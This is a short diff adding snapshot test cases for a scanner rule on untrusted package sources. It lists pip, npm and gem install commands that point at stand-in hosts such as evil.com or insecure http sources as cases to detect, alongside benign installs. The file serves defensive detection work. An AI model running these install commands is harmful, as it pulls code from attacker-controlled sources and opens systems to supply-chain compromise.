@@ -1,0 +1,16 @@
+# SC-003: Untrusted package source
+# Test cases for snapshot testing
+
+# === Cases that SHOULD be detected ===
+pip install --index-url http://evil.com/simple package
+pip install -i http://malicious-pypi.com/ package
+pip install git+http://github.com/user/repo.git
+npm install --registry http://evil.com package
+npm install git://github.com/user/malicious-repo.git
+gem install --source http://evil.com package
+pip install --trusted-host evil.com package
+
+# === Cases that should NOT be detected ===
+pip install requests
+pip install --index-url https://pypi.org/simple/ package
+npm install express
